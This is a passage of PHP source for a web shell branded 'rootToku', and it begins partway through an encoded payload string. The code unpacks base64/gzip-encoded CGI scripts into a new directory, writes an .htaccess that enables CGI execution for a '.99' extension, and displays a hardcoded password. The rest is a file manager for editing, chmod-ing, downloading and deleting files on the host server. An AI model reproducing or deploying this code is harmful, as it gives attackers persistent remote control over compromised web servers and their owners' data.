ec3iz6nfF5idebt/nIm5zad5vuLJ9DOdjqTepLsevVkZ2mLlT+P5i+NBo=";
if (isset($submit)){
$op = $_POST["option"];
switch ($op)
{
case 'cgipy': $cgi_dir = mkdir('t0ku_cgi', 0755);chdir('t0ku_cgi');$file_cgi = "cgipy.99";$memeg = ".htaccess";$isi_htcgi = "OPTIONS Indexes Includes ExecCGI FollowSymLinks \n AddType application/x-httpd-cgi .99 \n AddHandler cgi-script .99 \n AddHandler cgi-script .99";$htcgi = fopen(".htaccess", "w");$cgi = fopen($file_cgi, "w");fwrite($cgi, gzuncompress(base64_decode($cgipy)));fwrite($htcgi, $isi_htcgi);chmod($file_cgi, 0755);chmod($memeg, 0755);
break;case 'cgi' : $cgi_dir = mkdir('t0ku_cgi', 0755);chdir('t0ku_cgi');$file_cgi = "cgipl.99";$memeg = ".htaccess";$isi_htcgi = "OPTIONS Indexes Includes ExecCGI FollowSymLinks \n AddType application/x-httpd-cgi .99 \n AddHandler cgi-script .99 \n AddHandler cgi-script .99";$htcgi = fopen(".htaccess", "w");$cgi = fopen($file_cgi, "w");fwrite($cgi, gzuncompress(base64_decode($cgipl)));fwrite($htcgi, $isi_htcgi);chmod($file_cgi, 0755);chmod($memeg, 0755);;
break;default:break;
}}
$cgidir = 't0ku_cgi';
echo "<span class='text-success'>Successfully Summon CGI <br> Password : Lewster1337 </span><br><a class='text-primary' href='". $cgidir . "/" . $file_cgi ."' target=_blank>Klik Here</a>";
?>
</div>
                                </div>
                            </div>
                            <!-- endif -->
                            <?php endif; ?>
                            <!-- lockfiles -->
                            <?php if (isset($_POST['lockfile'])) : ?>
                            <div class="p-2">
                                <div class="row justify-content-center">
                                    <div class="card col-md-7 mb-3">
                                        <?php lockfiles(); ?>
                                        <?php echo '<span class="text-success">File Locked Success</span>';  ?>
                                    </div>
                                </div>
                            </div>
                            <!-- endif -->
                            <?php endif; ?>
            

                            <!-- new file -->
                            <div class="col-md-12">
                                <div class="collapse" id="newFileCollapse" data-bs-parent="#tools">
                                    <div class="row justify-content-center">
                                        <div class="col-md-5">
                                            <form action="" method="post">
                                                <div class="mb-3">
                                                    <label class="form-label">File Name</label>
                                                    <input type="text" class="form-control" name="newFileName" placeholder="test.php">
                                                </div>
                                                <div class="mb-3">
                                                    <label class="form-label">File Content</label>
                                                    <textarea class="form-control" rows="7" name="newFileContent" placeholder="Hello-World"></textarea>
                                                </div>
                                                <button type="submit" class="btn btn-outline-light">Create</button>
                                            </form>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <!-- new folder -->
                            <div class="col-md-12">
                                <div class="collapse" id="newFolderCollapse" data-bs-parent="#tools">
                                    <div class="row justify-content-center">
                                        <div class="col-md-5">
                                            <form action="" method="post">
                                                <div class="mb-3">
                                                    <label class="form-label">Folder Name</label>
                                                    <input type="text" class="form-control" name="newFolderName" placeholder="home">
                                                </div>
                                                <button type="submit" class="btn btn-outline-light">Create</button>
                                            </form>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>

                    <!-- file manager -->
                    <div class="table-responsive mt-3">
                        <table class="table table-hover text-light table-hover-gray">
                            <thead class="align-middle">
                                <tr>
                                    <td style="width:35%">Name</td>
                                    <td style="width:10%">Type</td>
                                    <td style="width:10%">Size</td>
                                    <td style="width:13%">Owner/Group</td>
                                    <td style="width:10%">Permission</td>
                                    <td style="width:13%">Last Modified</td>
                                    <td style="width:9%">Actions</td>
                                </tr>
                            </thead>
                            <tbody class="text-nowrap">
                                <!-- end php -->
                                <?php
                                    foreach ($dirs as $dir) :
                                        if (!is_dir($dir)) continue;
                                ?>

                                <tr>
                                    <td>
                                        <?php if ($dir === '..') : ?>

                                            <a href="?dir=<?= dirname($path); ?>" class="text-decoration-none text-light"><i class="fa fa-folder-open"></i> <?= $dir ?></a>
                                        <?php elseif ($dir === '.') :  ?>

                                            <a href="?dir=<?= $path; ?>" class="text-decoration-none text-light"><i class="fa fa-folder-open"></i> <?= $dir ?></a>
                                        <?php else : ?>

                                            <a href="?dir=<?= $path . '/' . $dir ?>" class="text-decoration-none text-light"><i class="fa fa-folder"></i> <?= $dir ?></a>
                                        <!-- endif -->
                                        <?php endif; ?>

                                    </td>
                                    <td class="text-light"><?= filetype($dir) ?></td>
                                    <td class="text-light">-</td>
                                    <td class="text-light"><?= getOwner($dir) ?></td>
                                    <td class="text-light">
                                    <!-- end php -->
                                        <?php
                                            echo '<a href="?dir='.$path.'&item='.$dir.'&action=chmod">';
                                                if(is_writable($path.'/'.$dir)) echo '<font color="lime">';
                                                elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
                                                echo perms($path.'/'.$dir);
                                                if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir))
                                            echo '</a>';
                                        ?>

                                    </td>
                                    <td class="text-light"><?= date("Y-m-d h:i:s", filemtime($dir)); ?></td>
                                    <td>
                                        <?php if ($dir != '.' && $dir != '..') : ?>

                                            <div class="btn-group">
                                                <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=rename" class="btn btn-outline-light btn-sm mr-1" data-toggle="tooltip" data-placement="auto" title="Rename"><i class="fa fa-edit"></i></a>
                                                <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=chmod" class="btn btn-outline-light btn-sm mr-1" data-toggle="tooltip" data-placement="auto" title="Change Permission"><i class="fa fa-star"></i></a>
                                                <a href="" class="btn btn-outline-light btn-sm mr-1" onclick="return deleteConfirm('?dir=<?= $path ?>&item=<?= $dir ?>&action=delete')" data-toggle="tooltip" data-placement="auto" title="Delete"><i class="fa fa-trash"></i></a>
                                            </div>
                                        <?php elseif ($dir === '.') : ?>

                                            <div class="btn-group">
                                                <a data-bs-toggle="collapse" href="#newFolderCollapse" role="button" aria-expanded="false" aria-controls="newFolderCollapse" class="btn btn-outline-light btn-sm mr-1" data-toggle="tooltip" data-placement="auto" title="New Folder"><i class="fa fa-folder-plus"></i></a>
                                                <a data-bs-toggle="collapse" href="#newFileCollapse" role="button" aria-expanded="false" aria-controls="newFileCollapse" class="btn btn-outline-light btn-sm mr-1" data-toggle="tooltip" data-placement="auto" title="New File"><i class="fa fa-file-plus"></i></a>
                                            </div>
                                        <!-- endif -->
                                        <?php endif; ?>

                                    </td>
                                </tr>
                                <!-- endforeach -->
                                <?php endforeach; ?>
                                    <!-- end php -->
                                    <?php
                                        foreach ($dirs as $dir) :
                                        if (!is_file($dir)) continue;
                                    ?>

                                    <tr>
                                        <td>
                                            <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=edit" class="text-decoration-none text-light"><i class="fa fa-file-code"></i> <?= $dir ?></a>
                                        </td>
                                        <td class="text-light"><?= (function_exists('mime_content_type') ? mime_content_type($dir) : filetype($dir)) ?></td>
                                        <td class="text-light"><?= fsize($dir) ?></td>
                                        <td class="text-light"><?= getOwner($dir) ?></td>
                                        <td class="text-light">
                                        <!-- end php -->
                                            <?php
                                                echo '<a href="?dir='.$path.'&item='.$dir.'&action=chmod">';
                                                    if(is_writable($path.'/'.$dir)) echo '<font color="lime">';
                                                    elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
                                                    echo perms($path.'/'.$dir);
                                                    if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir))
                                                echo '</a>';
                                            ?>

                                        </td>
                                        <td class="text-light"><?= date("Y-m-d h:i:s", filemtime($dir)); ?></td>
                                        <td>
                                            <?php if ($dir != '.' && $dir != '..') : ?>

                                                <div class="btn-group">
                                                    <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=edit" class="btn btn-outline-light btn-sm mr-1" data-toggle="tooltip" data-placement="auto" title="Edit"><i class="fa fa-file-edit"></i></a>
                                                    <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=rename" class="btn btn-outline-light btn-sm mr-1" data-toggle="tooltip" data-placement="auto" title="Rename"><i class="fa fa-edit"></i></a>
                                                    <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=chmod" class="btn btn-outline-light btn-sm mr-1" data-toggle="tooltip" data-placement="auto" title="Change Permission"><i class="fa fa-star"></i></a>
                                                    <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=download" class="btn btn-outline-light btn-sm mr-1" data-toggle="tooltip" data-placement="auto" title="Download"><i class="fa fa-file-download"></i></a>
                                                    <a href="" class="btn btn-outline-light btn-sm mr-1" onclick="return deleteConfirm('?dir=<?= $path ?>&item=<?= $dir ?>&action=delete')" data-toggle="tooltip" data-placement="auto" title="Delete"><i class="fa fa-trash"></i></a>
                                                </div>
                                            <!-- endif -->
                                            <?php endif; ?>

                                        </td>
                                    </tr>
                                <!-- endforeach -->
                                <?php endforeach; ?>

                            </tbody>
                        </table>
                    </div>
                    <center><div class="text-light my-1">&#169; rootToku</div></center>
                </div>
            </div>
        </div>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
        <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.4.0/dist/sweetalert2.all.min.js"></script>
        <script>
            <?php if (isset($_SESSION['message'])) : ?>
                Swal.fire(
                '<?= $_SESSION['status'] ?>',
                '<?= $_SESSION['message'] ?>',
                '<?= $_SESSION['class'] ?>'
                )
            <?php endif; clear(); ?>

            function deleteConfirm(url) {
                event.preventDefault()
                Swal.fire({
                    title: 'Are you sure?',
                    icon: 'warning',
                    showCancelButton: true,
                    confirmButtonColor: '#3085d6',
                    cancelButtonColor: '#d33',
                    confirmButtonText: 'Yes, delete it!'
                }).then((result) => {
                    if (result.isConfirmed) {
                        window.location.href = url
                    }
                })
            }
            function jscopy() {
                var jsCopy = document.getElementById("CopyFromTextArea");
                jsCopy.focus();
                jsCopy.select();
                document.execCommand("copy");
            }

        </script>
    </body>
</html>